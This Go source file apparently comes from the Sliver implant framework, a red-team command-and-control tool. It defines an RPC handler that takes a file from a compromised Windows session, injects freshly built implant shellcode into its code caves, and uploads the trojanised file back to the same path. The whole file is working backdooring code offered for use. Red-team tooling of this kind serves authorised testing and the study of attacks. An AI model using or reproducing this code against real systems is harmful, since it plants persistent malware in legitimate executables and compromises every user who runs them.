package rpc

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"

	"github.com/Binject/binjection/bj"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/server/codenames"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/util"
	"github.com/bishopfox/sliver/util/encoders"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
)

// Backdoor - Inject a sliver payload in a file on the remote system
func (rpc *Server) Backdoor(ctx context.Context, req *clientpb.BackdoorReq) (*clientpb.Backdoor, error) {
	resp := &clientpb.Backdoor{}
	if req == nil || req.Request == nil {
		return resp, ErrMissingRequestField
	}

	var (
		name string
		err  error
	)

	if req.Name == "" {
		name, err = codenames.GetCodename()
		if err != nil {
			return nil, rpcError(err)
		}
	} else if err := util.AllowedName(req.Name); err != nil {
		return nil, status.Error(codes.InvalidArgument, err.Error())
	} else {
		name = req.Name
	}

	session := core.Sessions.Get(req.Request.SessionID)
	if session == nil {
		return nil, ErrInvalidSessionID
	}
	if session.OS != "windows" {
		return nil, status.Error(codes.InvalidArgument, fmt.Sprintf("%s is currently not supported", session.OS))
	}
	download, err := rpc.Download(context.Background(), &sliverpb.DownloadReq{
		Request: &commonpb.Request{
			SessionID: session.ID,
			Timeout:   req.Request.Timeout,
		},
		Path: req.FilePath,
	})
	if err != nil {
		return nil, rpcError(err)
	}
	if download.Encoder == "gzip" {
		download.Data, err = new(encoders.Gzip).Decode(download.Data)
		if err != nil {
			return nil, rpcError(err)
		}
	}

	shellcode, err := rpc.buildProfileBytesForConsumer(ctx, req.ProfileName, name, "shellcode", "raw", "windows")
	if err != nil {
		return nil, err
	}
	bjConfig := &bj.BinjectConfig{
		CodeCaveMode: true,
	}
	newFile, err := bj.Binject(download.Data, shellcode, bjConfig)
	if err != nil {
		return nil, rpcError(err)
	}
	uploadGzip, _ := new(encoders.Gzip).Encode(newFile)
	// upload to remote target
	upload, err := rpc.Upload(context.Background(), &sliverpb.UploadReq{
		Encoder: "gzip",
		Data:    uploadGzip,
		Path:    req.FilePath,
		Request: &commonpb.Request{
			SessionID: session.ID,
			Timeout:   req.Request.Timeout,
		},
	})
	if err != nil {
		return nil, rpcError(err)
	}

	if upload.Response != nil && upload.Response.Err != "" {
		return nil, status.Error(codes.FailedPrecondition, upload.Response.Err)
	}

	return resp, nil
}
